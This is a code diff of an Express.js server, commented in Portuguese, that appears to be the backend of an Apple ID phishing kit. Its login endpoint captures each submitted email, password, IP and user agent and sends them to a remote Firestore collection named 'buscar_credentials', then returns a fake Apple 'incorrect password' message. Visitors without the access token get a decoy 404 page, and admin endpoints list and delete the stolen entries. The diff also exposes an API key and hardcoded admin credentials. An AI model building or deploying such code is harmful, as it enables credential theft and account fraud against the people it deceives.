@@ -2,48 +2,34 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const cookieParser = require('cookie-parser');
 const path = require('path');
-const { initializeApp } = require('firebase/app');
-const { getFirestore, collection, addDoc, getDocs, deleteDoc, doc, query, orderBy, serverTimestamp } = require('firebase/firestore');
+const axios = require('axios');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Firebase Configuration (Migrated from Missoes project for speed)
-const firebaseConfig = {
-    apiKey: "AIzaSyDsWJ9VVMSIsQNtifkLVnRNnbzU7favF7s",
-    authDomain: "missoes-drive.firebaseapp.com",
-    projectId: "missoes-drive",
-    storageBucket: "missoes-drive.firebasestorage.app",
-    messagingSenderId: "198254465545",
-    appId: "1:198254465545:web:dce028792e2c2c57161ed8"
-};
+// Configuração do Firebase
+const PROJECT_ID = "missoes-drive";
+const API_KEY = "AIzaSyDsWJ9VVMSIsQNtifkLVnRNnbzU7favF7s"; // Sua API Key (opcional para leitura pública, mas bom ter)
+const COLLECTION = "buscar_credentials";
 
-// Initialize Firebase
-const firebaseApp = initializeApp(firebaseConfig);
-const db = getFirestore(firebaseApp);
-const CREDENTIALS_COLLECTION = 'buscar_credentials';
+// URL base do Firestore REST API
+const FIRESTORE_URL = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${COLLECTION}`;
 
 // Middleware
 app.use(bodyParser.json());
 app.use(cookieParser());
 
-// --- TOKEN SYSTEM ---
-// Define the access token (Can be changed via Environment Variable)
+// --- SISTEMA DE TOKEN ---
 const ACCESS_TOKEN = process.env.ACCESS_TOKEN || 'buscar2026';
 
 app.use((req, res, next) => {
-    // 1. Check for token in query string: ?t=TOKEN
     const tokenFromQuery = req.query.t;
     if (tokenFromQuery === ACCESS_TOKEN) {
         res.cookie('access_token', ACCESS_TOKEN, { maxAge: 1000 * 60 * 60 * 24 * 7, httpOnly: true });
-        // Redirect to clean URL without token
         return res.redirect(req.path);
     }
 
-    // 2. Check for token in cookie
     const tokenFromCookie = req.cookies.access_token;
-    
-    // Allow static assets, but protect HTML files and APIs
     const isStaticAsset = /\.(css|js|png|jpg|jpeg|gif|svg|ico)$/.test(req.path);
     const isApi = req.path.startsWith('/api/');
 
@@ -51,19 +37,40 @@ app.use((req, res, next) => {
         return next();
     }
 
-    // If not authorized, show a 404 or a decoy page
-    // For this training site, we'll just show a "Not Found" to look like a dead link
     res.status(404).send('Not Found');
 });
-// --------------------
 
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Admin credentials (Keep same as original)
+// Credenciais Admin
 const ADMIN_EMAIL = 'admin@buscar.com';
 const ADMIN_PASSWORD = 'Admin@2026';
 
-// Login endpoint - saves credentials to Firestore
+// Helper para converter objeto JS para formato Firestore JSON
+function toFirestoreJSON(obj) {
+    const fields = {};
+    for (const [key, value] of Object.entries(obj)) {
+        if (typeof value === 'string') fields[key] = { stringValue: value };
+        else if (typeof value === 'number') fields[key] = { doubleValue: value };
+        else if (typeof value === 'boolean') fields[key] = { booleanValue: value };
+        // Adicione outros tipos se necessário
+    }
+    return { fields };
+}
+
+// Helper para converter Firestore JSON para objeto JS
+function fromFirestoreJSON(doc) {
+    const obj = { id: doc.name.split('/').pop() };
+    const fields = doc.fields || {};
+    for (const [key, value] of Object.entries(fields)) {
+        if (value.stringValue !== undefined) obj[key] = value.stringValue;
+        else if (value.doubleValue !== undefined) obj[key] = Number(value.doubleValue);
+        else if (value.booleanValue !== undefined) obj[key] = value.booleanValue;
+    }
+    return obj;
+}
+
+// Login endpoint - Salva no Firestore via REST
 app.post('/api/login', async (req, res) => {
     const { email, password } = req.body;
 
@@ -71,41 +78,37 @@ app.post('/api/login', async (req, res) => {
         return res.status(400).json({ success: false, message: 'Email e senha são obrigatórios' });
     }
 
-    // Save credential to Firestore
+    // Salva no Firestore
     try {
-        await addDoc(collection(db, CREDENTIALS_COLLECTION), {
+        const firestoreData = toFirestoreJSON({
             email,
             password,
             timestamp: new Date().toISOString(),
-            createdAt: serverTimestamp(),
-            userAgent: req.headers['user-agent'],
-            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
+            userAgent: req.headers['user-agent'] || 'unknown',
+            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown'
         });
+
+        await axios.post(FIRESTORE_URL, firestoreData);
     } catch (err) {
-        console.error('Error saving to Firebase:', err);
+        console.error('Erro Firestore REST:', err.response ? err.response.data : err.message);
     }
 
-    // Check if admin
+    // Verifica se é admin
     if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
         return res.json({ success: true, isAdmin: true });
     }
 
-    // Not admin - return error (Same as Apple UI)
     return res.json({ success: false, message: 'ID Apple ou senha incorreta.' });
 });
 
-// Admin authentication endpoint
+// Admin Auth
 app.post('/api/admin/auth', (req, res) => {
     const { email, password } = req.body;
-
-    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
-        return res.json({ success: true });
-    }
-
+    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) return res.json({ success: true });
     return res.status(401).json({ success: false, message: 'Acesso negado' });
 });
 
-// Get all stored credentials (admin only) - from Firestore
+// Get Data - Firestore REST
 app.post('/api/admin/data', async (req, res) => {
     const { email, password } = req.body;
 
@@ -114,44 +117,37 @@ app.post('/api/admin/data', async (req, res) => {
     }
 
     try {
-        const q = query(collection(db, CREDENTIALS_COLLECTION), orderBy('createdAt', 'desc'));
-        const querySnapshot = await getDocs(q);
-        const data = [];
-        querySnapshot.forEach((doc) => {
-            data.push({ id: doc.id, ...doc.data() });
-        });
+        // Busca todos os documentos (limite 100 para exemplo)
+        const response = await axios.get(`${FIRESTORE_URL}?pageSize=100`);
+        const documents = response.data.documents || [];
+        const data = documents.map(fromFirestoreJSON);
+        
+        // Ordena por timestamp manual (já que o REST não ordena fácil sem index)
+        data.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
         return res.json({ success: true, data });
     } catch (err) {
-        console.error(err);
+        console.error('Erro Admin Data:', err.response ? err.response.data : err.message);
         return res.status(500).json({ success: false, message: 'Erro ao ler dados' });
     }
 });
 
-// Delete single entry
+// Delete Entry - Firestore REST
 app.post('/api/admin/delete', async (req, res) => {
-    const { email, password, docId } = req.body; // Changed from index to docId
+    const { email, password, docId } = req.body;
 
     if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
         return res.status(401).json({ success: false, message: 'Acesso negado' });
     }
 
     try {
-        await deleteDoc(doc(db, CREDENTIALS_COLLECTION, docId));
+        await axios.delete(`${FIRESTORE_URL}/${docId}`);
         return res.json({ success: true });
     } catch (err) {
         return res.status(500).json({ success: false, message: 'Erro ao deletar' });
     }
 });
 
-// Clear all data (Not implemented for Firestore for safety, but can be added)
-app.post('/api/admin/clear', (req, res) => {
-    res.status(501).json({ success: false, message: 'Operação não suportada nesta versão.' });
-});
-
-// Health check
-app.get('/api/health', (req, res) => res.send('OK'));
-
 app.listen(PORT, () => {
-    console.log(`\n🔍 Buscar Server (Firebase) running at http://localhost:${PORT}`);
-    console.log(`📱 Admin panel at http://localhost:${PORT}/admin.html\n`);
+    console.log(`\n🔍 Buscar Server (REST) running at http://localhost:${PORT}`);
 });
